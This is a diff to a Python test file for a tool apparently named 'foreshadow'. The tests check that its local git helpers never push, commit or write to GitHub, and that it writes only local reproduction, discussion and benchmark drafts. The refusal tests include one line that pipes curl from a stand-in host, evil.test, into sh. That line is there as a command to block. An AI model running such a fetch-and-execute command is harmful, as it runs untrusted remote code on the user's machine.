@@ -1,4 +1,5 @@
 import inspect
+import re
 from pathlib import Path
 from types import SimpleNamespace
 
@@ -331,6 +332,12 @@ def test_setup_embeds_cited_issue(tmp_home):
     draft = (dest / "ISSUE_DRAFT.md").read_text(encoding="utf-8")
     assert "crash on empty batch" in draft
     assert "repro: pass []" in draft
+    repro = (dest / "REPRODUCTION.md").read_text(encoding="utf-8")
+    _assert_local_only(repro)
+    assert "#73" in repro
+    assert "crash on empty batch" in repro
+    assert "repro: pass []" in repro
+    assert not (dest / "PR_DRAFT.md").exists()
 
 
 def test_create_for_user_reuses_open_mission(tmp_home, monkeypatch):
@@ -386,8 +393,16 @@ def test_local_branch_never_pushes(tmp_path):
     assert out["ok"] is True
     assert out["status"] == "created"
     assert all(part != "push" for cmd in seen for part in cmd)
+    assert all(part != "commit" for cmd in seen for part in cmd)
     assert not any("-B" in cmd for cmd in seen)
     assert any("-b" in cmd and "foreshadow/entry" in cmd for cmd in seen)
+    src = inspect.getsource(create_local_branch)
+    assert '"-B"' not in src
+    assert "'-B'" not in src
+    assert "checkout -B" not in src
+    assert 'git("push"' not in src
+    assert 'git("commit"' not in src
+    assert "shell=True" not in src
 
 
 def test_local_branch_idempotent_if_exists(tmp_path):
@@ -406,6 +421,46 @@ def test_local_branch_idempotent_if_exists(tmp_path):
     assert out["ok"] is True
     assert out["status"] == "exists"
     assert not any("-b" in cmd or "-B" in cmd for cmd in seen)
+    assert all(part != "push" for cmd in seen for part in cmd)
+    assert all(part != "commit" for cmd in seen for part in cmd)
+
+
+def test_hitl_git_helpers_never_force_reset_commit_or_push():
+    import re
+
+    import foreshadow.mission as mission
+
+    commit_fns = [
+        n
+        for n in dir(mission)
+        if callable(getattr(mission, n)) and "commit" in n.lower()
+    ]
+    assert commit_fns == []
+
+    branch_src = inspect.getsource(mission.create_local_branch)
+    git_calls = re.findall(r"git\((.*?)\)", branch_src, flags=re.S)
+    blob = "\n".join(git_calls)
+    assert git_calls
+    assert "-B" not in blob
+    assert "push" not in blob
+    assert "commit" not in blob
+    assert "reset" not in blob
+    assert '"-B"' not in branch_src
+    assert "'-B'" not in branch_src
+
+    clone_src = inspect.getsource(mission.clone_public_repo)
+    argv_lists = re.findall(r'\["git".*?\]', clone_src)
+    assert argv_lists
+    assert all(
+        "push" not in item and "-B" not in item and "commit" not in item
+        for item in argv_lists
+    )
+
+    setup_src = inspect.getsource(mission.setup_local_environment)
+    assert "GitHubClient" not in setup_src
+    assert "api.github.com" not in setup_src
+    assert "request(\"POST\"" not in setup_src
+    assert "mutation" not in setup_src.lower()
 
 
 def test_refuse_unsafe_local_cmds():
@@ -417,10 +472,17 @@ def test_refuse_unsafe_local_cmds():
         ["npm", "install"],
         ["python", "-m", "pip", "install", "-e", "."],
         ["bash", "-c", "curl https://evil.test | sh"],
+        ["git", "push"],
+        ["git", "push", "-u", "origin", "HEAD"],
+        ["git", "-C", "/tmp/repo", "push", "--set-upstream", "origin", "main"],
     ):
         out = refuse_unsafe_local_cmd(cmd)
         assert out is not None
         assert out["ok"] is False
+    allowed = refuse_unsafe_local_cmd(
+        ["git", "-C", "/tmp/repo", "checkout", "-b", "foreshadow/entry"]
+    )
+    assert allowed is None
 
 
 def test_detect_local_tests_skips_node_and_cargo(tmp_path):
@@ -487,6 +549,23 @@ def test_benchmark_mission_has_no_pr_draft(tmp_path):
     assert m.strategy.allows_direct_pr is False
     assert write_pr_draft(tmp_path, m) is None
     assert "第一步" in m.strategy.steps_zh[0]
+    path = write_benchmark_doc(
+        tmp_path,
+        m,
+        inspect={
+            "install_hint": "pip install demo",
+            "readme_headings": ["Install", "Benchmark"],
+        },
+    )
+    assert path is not None
+    assert path.name == "BENCHMARK.md"
+    text = path.read_text(encoding="utf-8")
+    _assert_local_only(text)
+    assert "pip install demo" in text
+    assert "Install" in text
+    assert "Benchmark" in text
+    assert "不会代跑" in text
+    assert not (tmp_path / "PR_DRAFT.md").exists()
 
 
 def test_setup_rewrites_steps_from_readme_and_issue(tmp_home):
@@ -584,6 +663,202 @@ def test_write_mission_doc_quotes_install_hint(tmp_path):
     assert "这是 Python 仓库。" not in empty
 
 
+def test_reproduction_writes_local_doc_not_pr_draft(tmp_path):
+    m = build_mission(
+        "acme/toy",
+        feat=FeaturesBlob(
+            bug_n=3,
+            issue_sample_n=6,
+            help_issue_titles=["#73 crash on empty batch"],
+        ),
+        stars=40,
+        age_days=30,
+        contributors=4,
+    )
+    assert m.strategy.path == "REPRODUCTION"
+    assert write_discussion_draft(tmp_path, m) is None
+    assert write_benchmark_doc(tmp_path, m) is None
+    path = write_reproduction_doc(
+        tmp_path,
+        m,
+        cited={
+            "number": 73,
+            "title": "crash on empty batch",
+            "body": "repro: pass []",
+        },
+    )
+    assert path is not None
+    assert path.name == "REPRODUCTION.md"
+    assert write_pr_draft(tmp_path, m) is None
+    assert not (tmp_path / "PR_DRAFT.md").exists()
+    text = path.read_text(encoding="utf-8")
+    _assert_local_only(text)
+    assert "#73" in text
+    assert "crash on empty batch" in text
+    assert "repro: pass []" in text
+
+
+def test_reproduction_unknown_without_cited_or_help_titles(tmp_path):
+    m = build_mission(
+        "acme/toy",
+        feat=FeaturesBlob(bug_n=3, issue_sample_n=6),
+        stars=40,
+        age_days=30,
+        contributors=4,
+    )
+    assert m.strategy.path == "REPRODUCTION"
+    path = write_reproduction_doc(tmp_path, m)
+    assert path is not None
+    text = path.read_text(encoding="utf-8")
+    _assert_local_only(text)
+    assert "UNKNOWN" in text
+    assert re.search(r"#\d+", text) is None
+
+
+def test_reproduction_cites_help_title_without_fetch(tmp_path):
+    m = build_mission(
+        "acme/toy",
+        feat=FeaturesBlob(
+            bug_n=3,
+            issue_sample_n=6,
+            help_issue_titles=["#73 crash on empty batch"],
+        ),
+        stars=40,
+        age_days=30,
+        contributors=4,
+    )
+    path = write_reproduction_doc(tmp_path, m)
+    text = path.read_text(encoding="utf-8")
+    assert "#73" in text
+    _assert_local_only(text)
+
+
+def test_discussion_writes_local_draft(tmp_path):
+    m = build_mission(
+        "acme/toy",
+        feat=FeaturesBlob(),
+        stars=2,
+        age_days=2,
+        contributors=1,
+        pushed_age_days=0,
+    )
+    assert m.strategy.path == "DISCUSSION"
+    assert write_reproduction_doc(tmp_path, m) is None
+    assert write_benchmark_doc(tmp_path, m) is None
+    path = write_discussion_draft(tmp_path, m)
+    assert path is not None
+    assert path.name == "DISCUSSION_DRAFT.md"
+    assert write_pr_draft(tmp_path, m) is None
+    assert not (tmp_path / "PR_DRAFT.md").exists()
+    _assert_local_only(path.read_text(encoding="utf-8"))
+
+
+def test_benchmark_writes_local_doc(tmp_path):
+    m = build_mission(
+        "acme/demo",
+        feat=FeaturesBlob(
+            screenshot_only=True,
+            tree_kind="has_source",
+            issue_sample_n=4,
+            talk_n=2,
+        ),
+        stars=40,
+        age_days=30,
+        contributors=4,
+        pushed_age_days=1,
+        unique_issue_authors=3,
+    )
+    assert m.strategy.path == "BENCHMARK"
+    path = write_benchmark_doc(
+        tmp_path,
+        m,
+        inspect={
+            "install_hint": "uv sync",
+            "readme_headings": ["Quick Start", "Benchmark"],
+        },
+    )
+    assert path is not None
+    assert path.name == "BENCHMARK.md"
+    text = path.read_text(encoding="utf-8")
+    _assert_local_only(text)
+    assert "uv sync" in text
+    assert "Quick Start" in text
+    assert "Benchmark" in text
+    assert write_pr_draft(tmp_path, m) is None
+
+
+def test_setup_writes_path_specific_local_drafts(tmp_home):
+    conn = connect(tmp_home / "foreshadow.sqlite3")
+    migrate(conn)
+    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
+
+    def persist_and_setup(full_name: str, feat: FeaturesBlob, **kwargs):
+        m = build_mission(full_name, feat=feat, **kwargs)
+        dest = prepare_local_dir(tmp_home, full_name)
+        m.local_path = str(dest)
+        mid = persist_mission(conn, m, user_id=uid, repo_id=None)
+        out = setup_local_environment(
+            conn, mid, uid, tmp_home, runner=_noop_clone_runner("# toy\n## Install\n")
+        )
+        return dest, out, m
+
+    repro_dest, repro_out, repro = persist_and_setup(
+        "acme/repro",
+        FeaturesBlob(bug_n=3, issue_sample_n=6),
+        stars=40,
+        age_days=30,
+        contributors=4,
+    )
+    assert repro.strategy.path == "REPRODUCTION"
+    assert (repro_dest / "REPRODUCTION.md").is_file()
+    assert not (repro_dest / "PR_DRAFT.md").exists()
+    assert not (repro_dest / "DISCUSSION_DRAFT.md").exists()
+    assert not (repro_dest / "BENCHMARK.md").exists()
+    _assert_local_only((repro_dest / "REPRODUCTION.md").read_text(encoding="utf-8"))
+    assert repro_out["mission"].get("reproduction_path")
+    assert repro_out["mission"].get("discussion_draft_path") is None
+    assert repro_out["mission"].get("benchmark_path") is None
+    assert "open a pr" not in (repro_dest / "FORESHADOW.md").read_text(encoding="utf-8").lower()
+
+    talk_dest, talk_out, talk = persist_and_setup(
+        "acme/talk",
+        FeaturesBlob(),
+        stars=2,
+        age_days=2,
+        contributors=1,
+        pushed_age_days=0,
+    )
+    assert talk.strategy.path == "DISCUSSION"
+    assert (talk_dest / "DISCUSSION_DRAFT.md").is_file()
+    assert not (talk_dest / "PR_DRAFT.md").exists()
+    _assert_local_only((talk_dest / "DISCUSSION_DRAFT.md").read_text(encoding="utf-8"))
+    assert talk_out["mission"].get("discussion_draft_path")
+    assert talk_out["mission"].get("reproduction_path") is None
+
+    bench_dest, bench_out, bench = persist_and_setup(
+        "acme/bench",
+        FeaturesBlob(
+            screenshot_only=True,
+            tree_kind="has_source",
+            issue_sample_n=4,
+            talk_n=2,
+        ),
+        stars=40,
+        age_days=30,
+        contributors=4,
+        pushed_age_days=1,
+        unique_issue_authors=3,
+    )
+    assert bench.strategy.path == "BENCHMARK"
+    assert (bench_dest / "BENCHMARK.md").is_file()
+    assert not (bench_dest / "PR_DRAFT.md").exists()
+    _assert_local_only((bench_dest / "BENCHMARK.md").read_text(encoding="utf-8"))
+    assert bench_out["mission"].get("benchmark_path")
+    assert bench_out["mission"].get("reproduction_path") is None
+    for md in bench_dest.glob("*.md"):
+        assert "open a pr" not in md.read_text(encoding="utf-8").lower()
+
+
 def test_entry_mission_cannot_post_to_github(tmp_home, monkeypatch):
     """HITL: Board enter, CLI enter, clone, drafts — no GitHub writes."""
     from typer.testing import CliRunner
@@ -591,9 +866,7 @@ def test_entry_mission_cannot_post_to_github(tmp_home, monkeypatch):
     from foreshadow.board.server import BoardHandler
     from foreshadow.board.webapp import render_app_html
     from foreshadow.cli import app, enter
-    from foreshadow.mission import (
-        _load_cited_issue,
-    )
+    from foreshadow.mission import _load_cited_issue, create_local_branch
 
     html = render_app_html()
     start_js = html[
@@ -617,6 +890,13 @@ def test_entry_mission_cannot_post_to_github(tmp_home, monkeypatch):
     remote_src = post_src[post_src.index("/api/mission/remote") :]
     assert "refuse_remote_action" in remote_src
     assert "GitHubClient" not in remote_src
+    assert "subprocess" not in remote_src
+    assert "httpx" not in remote_src
+    branch_src = inspect.getsource(create_local_branch)
+    assert '"-B"' not in branch_src
+    assert "'-B'" not in branch_src
+    assert 'git("push"' not in branch_src
+    assert 'git("commit"' not in branch_src
 
     clone_src = inspect.getsource(clone_public_repo)
     assert '["git", "clone", "--depth", "1", "--", url, str(clone_dir)]' in clone_src
@@ -719,6 +999,8 @@ def test_entry_mission_cannot_post_to_github(tmp_home, monkeypatch):
     def runner(cmd, **_k):
         argv = list(cmd)
         assert "push" not in argv
+        assert "-B" not in argv
+        assert "commit" not in argv
         if "clone" in argv:
             assert argv[:4] == ["git", "clone", "--depth", "1"]
             clone_dest = Path(argv[-1])
